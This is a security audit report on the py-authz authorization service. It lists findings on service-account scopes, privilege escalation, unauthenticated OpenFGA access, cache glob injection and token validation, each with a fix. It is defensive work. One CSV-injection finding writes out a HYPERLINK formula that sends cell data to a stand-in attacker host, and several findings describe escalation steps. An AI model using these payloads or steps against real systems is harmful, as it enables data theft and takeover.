# py-authz — Security & Identity Audit (Round 3)

**Date:** 2026-11-24 · repo as of `6a54c93` (1.6.0, after `01`–`09` all
shipped).
**Scope:** the control-plane API's trust boundary (operator RBAC, service
accounts, scopes, rotation/revocation, bootstrap), OIDC token acceptance,
cache invalidation, tenant lifecycle as it affects authorization state,
the Next.js BFF (session, logout, export, headers), and supply chain.
**Method:** read `02`, `06` and `09` first so nothing here re-files a
shipped item. The control plane, which `09` built and shipped in a single
day, gets the most attention. Every finding was checked against source.
Findings marked **REPRODUCED** were confirmed with a throwaway script
against the in-process app (`TestClient` + `InMemoryFGAClient`). Findings
marked **READ-ONLY** come from reading the code.

> **Read SEC3-1, SEC3-2 and SEC3-3 together.** Today, service-account
> principals probably can't be authorized against a *real* OpenFGA at all
> (SEC3-3), because the RBAC model has no `service` subject type, and the
> unit tests hide this through the type-permissive `InMemoryFGAClient`.
> The obvious one-line fix for SEC3-3 immediately makes SEC3-1 (scopes
> never enforced) and SEC3-2 (admin → owner escalation via SA rotation)
> exploitable in production. **Ship all three in one change.**

---

## 🟠 HIGH

**SEC3-1. Service-account scopes are never enforced on any real route.**
`control_plane/auth.py:151` takes `require_system_role(min_relation, *,
service_account_scope=None)`. `_check_service_account_scope` returns early
when `required_scope is None` (`auth.py:129-130`). No route passes the
argument: `grep -rn "service_account_scope=" py_authz/control_plane/routes`
returns nothing. Every route dependency is declared as, for example,
`_require_admin = require_system_role("admin")`
(`routes/service_accounts.py:23`), with the same pattern in `tenants.py`
and `migrations.py`. `ServiceAccountCreateRequest.scopes` (`schemas.py`)
is a free-form `list[str]` that is never validated against a known set.
→ **Consequence:** an SA created with `scopes=[]` (or `["audit:read"]`)
that holds any RBAC role can call every route that role allows. The
scope model shown in the UI and in `docs/control_plane.md` protects
nothing. REPRODUCED: an SA with `scopes=[]` and `system#operator` got 200
from `POST /api/v1/tenants`.
→ **Fix:** define a closed scope enum (`tenants:write`, `tenants:read`,
`models:sync`, `migrations:run`, `audit:read`, `cache:write`,
`service_accounts:manage`, `operators:manage`), validate it on create,
and pass `service_account_scope=` on every dependency. Make the check
**deny by default**: an SA principal hitting a route that declares no
scope gets 403, so a newly added route can't silently skip the check.
**Effort: M.** *(Test gap:
`test_auth.py::test_service_account_needs_both_scope_and_rbac_role` only
exercises a synthetic `/system-scoped` route defined in the test, not
any production route.)*

**SEC3-2. A `system#admin` can escalate to `system#owner` by rotating,
or re-creating by name, a more privileged service account.**
- `routes/service_accounts.py:73` gates `POST /{account_id}/rotate` only
  on `_require_admin`, and the route returns the new plaintext secret.
- The SA principal is keyed by its mutable **name**:
  `Identity(id=f"service:{record.name}")` (`auth.py:92`).
- The unique name index is partial, `WHERE revoked_at IS NULL`
  (`storage/sql/0005_service_accounts.sql`), so a name can be reused
  after revoke.
- `revoke` never removes the SA's RBAC tuples.

**Exploit:**
1. Mallory holds `system#admin`. A direct self-grant of owner is refused
   (`POST /operators/roles` requires `system#owner`).
2. She rotates `deployer`, an SA holding `system#owner`, and receives its
   new secret.
3. As `deployer`, she calls
   `POST /operators/roles {"subject":"mallory","scope":"system","role":"owner"}`
   and gets 200.

Variant: revoke a privileged SA, create a new SA with the same name, and
the new SA inherits the old grants. REPRODUCED against in-memory RBAC.

→ **Fix:**
- Rotating, revoking or creating an SA requires an effective role **at
  least as high as the target SA's own** (simplest version: require
  `system#owner` for any SA that holds a role ≥ admin).
- Key SA identity on the immutable id (`service_account:sa_<uuid>`), not
  on the name.
- Delete the SA's RBAC tuples on revoke.

**Effort: M.** *(No test: `test_service_accounts_routes.py` checks admin
gating only.)*

**SEC3-3. SA principals use a subject type (`service`) that the RBAC
model doesn't define, so SAs can't hold roles on a real OpenFGA, and the
API can't grant them one anyway.** `control_plane/rbac_model.py:44-58`
declares every relation with the default subjects (`Relation("owner")`).
`modeling/base.py:149` defaults `subjects` to `["user"]`, so the generated
model allows only `{"type":"user"}` on `system`/`tenant` relations.
`routes/operators.py:159` and `:185` hard-code
`Identity(id=f"user:{body.subject}")` for grant and revoke, so there's no
way to target an SA. Real OpenFGA rejects a Check or Write whose user
type the model doesn't define, with a 400. Through `ExternalServiceError`
(see `11`'s ARCH3-7), that surfaces as a 503 on every SA request.
→ **Consequence:** the headline CP-3 feature (machine identities) is
non-functional in production. `09`'s live end-to-end pass never
exercised an SA, and `tests/live/test_control_plane_live.py` had no SA
flow (see `13`'s DX3-1). **REPRODUCED against a real OpenFGA v1.19
during the fix:** with the pre-fix model shape, both a write and a check
for `service:ci-bot` returned `400 Bad Request`.
→ **Fix (with SEC3-1/SEC3-2):** add a `service_account` type and
`subjects=["user", "service_account"]` on the RBAC relations. Add
`subject_kind: Literal["user","service_account"]` to the role-grant
schema. Add a live test: create an SA, grant it a role, authenticate,
call a scoped route. **Effort: S–M.**

**SEC3-4. A tenant admin can grant `tenant#owner` (including to
themselves) and can revoke any role on the tenant, including owners
assigned by the system owner.** `routes/operators.py` `_authorize_assignment`
(around line 76): `if await rbac_authz.can("admin", principal.identity,
tenant_resource): return`. This runs before any comparison between the
role being granted or revoked and the caller's own role.
→ **Exploit:** Bob (`tenant:acme#admin`) grants himself `tenant#owner`
(200), then revokes Carol's `tenant#owner` (200), even though Carol was
assigned by `system#owner`. A rogue or compromised tenant admin can lock
every other operator out and become the tenant's sole owner. REPRODUCED.
Unlike SEC3-2, this works against a real OpenFGA today.
→ **Fix:** a caller may grant or revoke only roles **strictly below**
their own effective role on that tenant. Granting or revoking
`tenant#owner` requires `tenant#owner` or `system#owner`. Apply the same
rule to the system scope for symmetry. **Effort: S.** *(Test encodes the
bug:
`test_operators_routes.py::test_granting_a_tenant_role_accepts_tenant_admin`
asserts the permissive behaviour without checking which role is granted.)*

**SEC3-5. The control-plane RBAC store shares the product's
unauthenticated OpenFGA by default, and `OpenFGAClient` can't
authenticate to OpenFGA at all.** `settings.py:103`:
`rbac_fga_api_url=os.environ.get("CONTROL_PLANE_FGA_API_URL", fga_api_url)`.
`clients/openfga.py:60-101`: the constructor accepts no API token,
preshared key or OIDC client credentials, and the `httpx.AsyncClient`
sends no `Authorization` header. So OpenFGA *must* run with
`OPENFGA_AUTHN_METHOD` unset (as `docker-compose.yml` does).
→ **Exploit:** every product service needs network reach to OpenFGA. Any
of them, or anything else on that network segment, can call `ListStores`
to find the RBAC store, then write `user:attacker owner system:default`.
That makes it owner of the whole control plane and, transitively, admin
of every tenant. The RBAC store id also leaks in 5xx details (SEC3-11).
READ-ONLY.
→ **Fix:**
- Support OpenFGA preshared-key and OIDC client-credentials auth in
  `OpenFGAClient` (an `api_token=` / `credentials=` parameter, threaded
  through `for_tenant`). This depends on `11`'s ARCH3-11: there is
  currently no shared place to configure a connection.
- Document that the RBAC store belongs on an authenticated, ideally
  separate, OpenFGA instance.
- Log a startup warning (or fail, behind a
  `CONTROL_PLANE_ALLOW_SHARED_UNAUTHENTICATED_FGA` escape hatch) when
  the RBAC URL equals the product URL and no credentials are configured.

**Effort: M.**

**SEC3-6. `POST /cache/invalidate` by tenant (or tenant + user) silently
deletes nothing, and the fragment allows glob injection.**
`routes/cache.py:45` builds `fragment = f"{body.tenant_id}:{fragment}"`,
and `:50` calls `delete_by_fragment(f"{body.tenant_id}:")`. Tenant cache
keys are namespaced by **store id**, not tenant id:
`MultiTenantAuthz.for_tenant()` passes `cache_namespace=store_id`
(`api.py:644`). This is the same mismatch `09` already fixed for audit
logs (`routes/audit.py` resolves tenant → store). `cache/redis.py:174`
builds `pattern = f"{self._prefix}*{fragment}*"` with no escaping of `*`,
`?`, `[`, `]`.
→ **Consequence:** an operator invalidates `acme` after an out-of-band
permission change, the response says `{"deleted": 0}`, and stale **allow**
decisions keep being served until TTL. "Tenant" is the default mode in
`cache-invalidate-form.tsx`. `tenant_id="*"` deletes the entire cache, and
because the match is a substring, a tenant fragment can also hit other
tenants' keys whose user or resource contains `"<tenant>:"`. REPRODUCED:
a key `py_authz:01HSTOREIDACME:…` survived `tenant_id=acme` and was removed
by `tenant_id="*"`.
→ **Fix:** resolve `tenant_store.get(tenant_id)` to a store id (404 if
unknown) and use a **prefix** pattern `f"{prefix}{store_id}:*"`. Escape
glob metacharacters (`redis` patterns: `\*`, `\?`, `\[`, `\]`) in every
caller-supplied fragment, including `user_id`. **Effort: S.** *(Two
tests encode the bug: `test_cache_routes.py::test_invalidate_by_tenant_id`
and `::test_invalidate_by_user_id_scoped_to_tenant` assert the `"acme:"`
fragment against a fake cache.)*

---

## 🟡 MEDIUM

**SEC3-7. Deprovisioning a tenant leaves its RBAC grants behind, so a
re-created tenant id inherits the previous operators.**
`routes/tenants.py:65-76` calls only
`tenant_manager.deprovision(tenant_id, model_registry=...)`. Nothing
touches the `tenant:<id>` tuples in the RBAC store, or that tenant's
`model_versions` rows. Tenant ids are human-chosen, so reuse is likely.
→ **Exploit:** Bob (`tenant:acme#admin`) deprovisions `acme`. A new
customer is later provisioned as `acme`, and Bob administers it
immediately, including its grants and its audit log. REPRODUCED: after
the DELETE, `can("admin", bob, tenant:acme)` is still `True`.
→ **Fix:** on deprovision, `read_tuples(object="tenant:<id>")` from the
RBAC store and delete them all, in the same job as the store deletion.
Alternatively, key RBAC objects on an immutable generation id. The
operational half of this (stale `MultiTenantAuthz` clients) is `12`'s
REL3-4. **Effort: S.** *(No test.)*

**SEC3-8. Operator token acceptance is too broad.**
- `adapters/oidc.py:234-247`: `jwt.decode(..., algorithms, audience,
  issuer, leeway)` with no `options={"require": [...]}`. PyJWT accepts a
  token with **no `exp`** as valid forever.
- There's no check of `typ` (Keycloak marks ID tokens `"ID"` and access
  tokens `"Bearer"`) or of `azp`.
- `control-panel/.env.local.example` (`OIDC_CLIENT_ID=py-authz-demo`) and
  `.env.example` (`CONTROL_PLANE_OIDC_AUDIENCE=py-authz-demo`) reuse the
  **product example's** client and audience.
- `auth.py:55` calls `operator_store.record_login(...)` on every request,
  before any role check, so any realm user's token creates an `operators`
  row.

→ **Exploit:** any product service that receives an operator's bearer
token, or ID token (whose `aud` is the client id), can replay it against
the control plane with that operator's `system#owner` rights. REPRODUCED:
a signed token with no `exp` and `typ: "ID"` validated.
→ **Fix:**
- `options={"require": ["exp", "iat", "sub", "iss", "aud"]}`.
- Optional `expected_typ="Bearer"` and `allowed_azp=` on
  `OIDCJWTValidator`, set by the control plane.
- In the docs and env examples, give the control panel its own Keycloak
  client and audience (e.g. `py-authz-control-plane`).
- Call `record_login` only from `/auth/me`, or only after a successful
  RBAC check.

**Effort: S–M.** *(No test with a real signed token; see `13`'s DX3-3.)*

**SEC3-9. Unauthenticated memory growth in `InMemoryRateLimiter`, the
default when Redis isn't configured.** `auth.py:84-85` calls
`rate_limiter.record_failure(account_id)` even when `record is None`
(unknown account). `account_id` is parsed from attacker input
(`pasa_<anything>.<secret>`) with no format or length check.
`rate_limit.py:80` (`self._failure_times[key] = attempts`) inserts a key
for anything. Entries are pruned only when the same key is touched again.
→ **Exploit:** 20,000 unauthenticated requests left 20,000 tracked keys
(about 7.7 MB). Growth is linear and unbounded, and each request also
costs a Postgres lookup. REPRODUCED.
→ **Fix:** validate `account_id` against `^sa_[0-9a-f]{32}$` before any
lookup. Don't record failures for unknown ids (rate-limit those per
source IP or globally instead). Bound the dicts (TTL sweep or LRU cap).
**Effort: S.**

**SEC3-10. CSV/formula injection in the audit-log export.**
`control-panel/src/app/api/export/audit-logs/route.ts:70-72`: `escape`
only quotes values matching `/[",\n]/`. A leading `= + - @ \t \r` isn't
neutralised, and a bare `\r` isn't quoted. `user_id`, `resource` and
`reason` are attacker-influenced: a tenant admin writes them directly via
`POST /tenants/{id}/grants` (where `reason` is free text up to 2000
characters), and product end-users feed `user_id`/`resource` into the
shared `audit_logs` table.
→ **Exploit:** `=HYPERLINK("https://evil/?"&A2,"x")` executes when a
system auditor opens the CSV in Excel or Sheets. READ-ONLY.
→ **Fix:** prefix any cell starting with `=+-@\t\r` with `'`, quote any
value containing `\r`, and send `Content-Type: text/csv; charset=utf-8`.
**Effort: S.**

**SEC3-11. Internal details are echoed to callers, including
unauthenticated ones, and the admin API's schema is publicly
browsable.**
- `control_plane/errors.py:73` returns `"detail": str(exc)` for 5xx too.
  That includes `IdentityProviderUnavailable("Unable to fetch JWKS from
  {jwks_url}")`, sent to unauthenticated callers, and `"Unexpected error
  during OpenFGA {method} {path}"`, whose path contains the RBAC store id.
- `routes/health.py` returns `f"unreachable: {exc}"` on the
  unauthenticated `/health`.
- `routes/migrations.py:78` and `jobs.py:216-221` persist and return
  `str(exc)`.
- `app.py:213` is `FastAPI(title=..., lifespan=...)` with default
  `docs_url`, `redoc_url` and `openapi_url`, so the full admin route
  surface is readable without authentication.

→ **Fix:**
- Return a generic `detail` (plus a request id) for status ≥ 500 and log
  the full error server-side.
- Strip exception text from `/health`.
- Add `CONTROL_PLANE_EXPOSE_DOCS` (default `false`).

**Effort: S.** *(`test_errors.py` asserts the passthrough.)*

**SEC3-12. BFF session lifetime and logout weaknesses, and no security
headers.**
- `control-panel/src/lib/session.ts:119-129` enforces the 8-hour limit
  only through cookie `maxAge`, which the browser enforces. The sealed
  blob has no issued-at or absolute expiry, so a stolen cookie value
  works for as long as Keycloak keeps refreshing.
- `app/api/auth/logout/route.ts:7` is a `GET` that only deletes the
  cookie. It doesn't revoke the refresh token or redirect to
  `end_session_endpoint`, so the next "login" silently signs back in via
  the SSO session. As a `GET`, it can also be triggered cross-site.
- `next.config.ts` is empty and `proxy.ts` sets no headers: no CSP, no
  `frame-ancestors`/`X-Frame-Options`, no `Referrer-Policy`. The
  destructive confirm dialogs (deprovision, revoke, rotate) can therefore
  be clickjacked.

→ **Fix:**
- Seal `iat`/`exp` into the session and enforce them server-side.
- Make logout a `POST` that calls the IdP revocation endpoint and
  redirects to `end_session_endpoint`.
- Add `headers()` in `next.config.ts`: a CSP with
  `frame-ancestors 'none'`, plus `X-Content-Type-Options: nosniff` and
  `Referrer-Policy: same-origin`.

**Effort: S.**

---

## 🟢 LOW

**SEC3-13. Anyone who knows an SA id can keep that SA locked out.**
`auth.py:75-80` refuses even the correct secret during lockout, keyed by
the public account id. SA ids are listed to any `system#auditor` and are
embedded in every secret. Five bad requests every 300 s keep a CI or
deploy SA at 429 indefinitely. This is a known cost of the CP-16 design.
→ Key the lockout on `(account_id, client network)`, or switch to
exponential verification backoff, and alert on lockouts. **Effort: S.**
*(`test_auth.py::test_lockout_also_blocks_the_correct_secret` pins the
current behaviour.)*

**SEC3-14. `KeycloakAuthMiddleware` returns 500, not 401, on an invalid
token.** `adapters/keycloak_fastapi.py:44,55` raise `HTTPException`
inside `BaseHTTPMiddleware.dispatch`, where Starlette's exception
handlers don't run. The request still fails closed, but anyone can
generate error-level 500s, which pollutes alerting. REPRODUCED through a
real app.
→ Return `JSONResponse(status_code=401 | 503)` directly. Fix the test to
go through `TestClient` rather than calling `dispatch()` directly.
**Effort: S.**

**SEC3-15. Supply-chain gaps.**
- `.github/dependabot.yml` has no `npm` ecosystem entry for
  `/control-panel` (Next 16 / React 19 get no CVE PRs).
- No `pnpm audit` runs anywhere.
- `make install-dev` runs `uv sync --group dev` without `--locked`, and
  `uv.lock` is already stale at the 1.6.0 release (it still records
  1.5.0), so CI can resolve versions that differ from the lockfile.
- The SEC2-10 upper bounds (`pyjwt<3`, `httpx<1`) only partly reach
  consumers, because the extras aren't real extras: see `11`'s ARCH3-1.

→ Add npm to Dependabot, a `pnpm audit --prod` CI step (see `13`'s
DX3-7), and `uv sync --locked`. Have semantic-release refresh `uv.lock`.
**Effort: S.**

---

## Areas checked, no issue

- **Argon2id and secrets:** parameters (m=19 MiB, t=3, p=1);
  `verify_secret` treats any exception as a mismatch; 256-bit secret
  entropy; `secret_hash` never serialized; revoke overwrites the hash.
- **Request logging:** no headers, query strings or bodies logged
  (`logging_middleware.py`).
- **Proxy headers and CORS:** no `X-Forwarded-For` trust anywhere; no
  CORS middleware (the BFF calls server-to-server).
- **Tenant scoping on routes:** rollback checks
  `version.tenant_id == path tenant`; tuple routes use `for_tenant`
  without auto-provisioning; audit `tenant_id` resolves to the store id;
  unscoped audit queries need a system role.
- **Break-glass bootstrap:** exact `user:{sub}` match, only while
  `system:default` is empty, under a lock.
- **SQL:** every new control-plane store query is parameterized.
- **OIDC login flow:** PKCE S256, `state` verified, single-use httpOnly
  flow cookies. The session cookie is httpOnly, `Secure` in production,
  `SameSite=Lax`, sealed with AES-256-GCM and a random 96-bit IV.
- **Server actions:** Next's Origin check applies; path segments use
  `encodeURIComponent`; `apiFetch` never forwards browser headers.
- **Workflows:** actions SHA-pinned, `contents: read` default, PyPI via
  OIDC trusted publishing.
